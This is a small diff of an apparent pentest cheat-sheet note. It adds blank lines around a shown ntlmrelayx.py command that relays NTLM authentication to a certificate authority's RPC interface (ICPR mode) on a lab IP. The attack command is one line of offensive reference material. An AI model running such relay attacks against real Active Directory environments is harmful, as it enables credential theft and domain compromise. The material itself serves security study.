@@ -14,3 +14,5 @@ updated_at: '2023-04-10T20:26:28.183284+00:00'
 ```ps1
 ntlmrelayx.py -t rpc://10.10.10.10 -rpc-mode ICPR -icpr-ca-name lab-DC-CA -smb2support
 ```
+
+
